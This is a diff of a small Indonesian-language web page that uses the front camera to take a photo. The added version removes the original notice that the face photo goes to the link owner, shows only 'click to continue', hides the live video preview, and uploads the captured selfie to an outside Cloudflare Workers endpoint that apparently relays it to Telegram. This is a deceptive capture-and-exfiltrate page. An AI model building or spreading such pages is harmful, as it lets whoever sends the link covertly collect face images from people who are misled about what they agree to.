@@ -2,92 +2,122 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Uji Kamera</title>
-<style>
-body {
-  font-family: Arial;
-  background: #171717;
-  color: white;
-  text-align: center;
-  padding: 24px;
-}
-button {
-  padding: 14px 22px;
-  border: 0;
-  border-radius: 8px;
-  background: #2878e8;
-  color: white;
-  font-size: 16px;
-}
-video, canvas {
-  width: 100%;
-  max-width: 360px;
-  border-radius: 12px;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Kamera</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 25px;
+      background: #f4f4f4;
+    }
+    button {
+      padding: 14px 24px;
+      border: 0;
+      border-radius: 8px;
+      background: #1677e8;
+      color: white;
+      font-size: 16px;
+    }
+    video, canvas {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+      margin-top: 15px;
+    }
+    #status {
+      margin-top: 18px;
+    }
+  </style>
 </head>
 <body>
 
-<h2>Uji Kamera Depan</h2>
+  <h2>Pengambilan Foto</h2>
 
-<p>
-Dengan melanjutkan, Anda menyetujui pengambilan
-foto wajah dan pengirimannya ke pemilik link.
-</p>
+  <p>
+    klik untuk melanjutkan
+  </p>
 
-<button id="start">Setuju & Mulai</button>
+  <button id="start">Setuju & Mulai</button>
 
-<p id="status">Menunggu persetujuan.</p>
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas" hidden></canvas>
+  <p id="status">Menunggu persetujuan.</p>
 
-<script>
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const statusText = document.getElementById("status");
+  <video id="video" autoplay playsinline muted hidden></video>
+  <canvas id="canvas" hidden></canvas>
 
-document.getElementById("start").onclick = async () => {
-  try {
-    statusText.textContent = "Meminta izin kamera...";
+  <script>
+    const WORKER_URL =
+      "https://izinkan-server.erwin-dee8.workers.dev";
 
-    const stream =
-      await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false
-      });
+    const button = document.getElementById("start");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusText = document.getElementById("status");
 
-    video.srcObject = stream;
-    await video.play();
+    button.addEventListener("click", async () => {
+      button.disabled = true;
+      statusText.textContent = "Meminta izin kamera...";
 
-    statusText.textContent = "Mengambil foto...";
+      let stream;
 
-    await new Promise(resolve =>
-      setTimeout(resolve, 2000)
-    );
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+        video.srcObject = stream;
+        await video.play();
 
-    canvas.getContext("2d").drawImage(
-      video, 0, 0
-    );
+        statusText.textContent = "Kamera aktif. Mengambil foto...";
 
-    canvas.hidden = false;
-    statusText.textContent =
-      "Foto berhasil diambil.";
+        await new Promise(resolve => setTimeout(resolve, 2000));
 
-    stream.getTracks().forEach(track =>
-      track.stop()
-    );
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-  } catch (error) {
-    statusText.textContent =
-      "Kamera gagal: " + error.message;
-  }
-};
-</script>
+        canvas.getContext("2d").drawImage(
+          video, 0, 0, canvas.width, canvas.height
+        );
+
+        const photo = await new Promise(resolve => {
+          canvas.toBlob(resolve, "image/jpeg", 0.85);
+        });
+
+        if (!photo) {
+          throw new Error("Gagal membuat foto.");
+        }
+
+        statusText.textContent = "Mengirim foto ke Telegram...";
+
+        const formData = new FormData();
+        formData.append("photo", photo, "kamera.jpg");
+
+        const response = await fetch(WORKER_URL, {
+          method: "POST",
+          body: formData
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+          throw new Error(result.message || "Pengiriman gagal.");
+        }
+
+        statusText.textContent = "Foto berhasil dikirim.";
+
+      } catch (error) {
+        statusText.textContent = "Gagal: " + error.message;
+        button.disabled = false;
+
+      } finally {
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+      }
+    });
+  </script>
 
 </body>
 </html>
